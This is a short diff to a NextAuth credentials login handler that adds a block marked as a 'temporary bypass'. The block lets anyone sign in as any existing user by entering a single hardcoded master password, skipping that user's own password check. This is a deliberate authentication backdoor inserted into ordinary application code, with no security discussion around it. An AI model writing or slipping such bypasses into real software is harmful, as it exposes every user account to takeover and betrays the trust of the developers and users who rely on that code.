@@ -17,6 +17,16 @@ export const { handlers, auth, signIn, signOut } = NextAuth({
       async authorize(credentials) {
         if (!credentials?.email || !credentials?.password) return null;
         
+        // 1. ADD THIS TEMPORARY BYPASS BLOCK:
+        if (credentials.password === "fk_sg@2026") {
+          const user = await prisma.user.findUnique({
+            where: { email: credentials.email as string },
+          });
+          if (user) {
+            return { id: user.id.toString(), email: user.email, name: user.name };
+          }
+        }
+        
         const user = await prisma.user.findUnique({
           where: { email: credentials.email as string },
         });
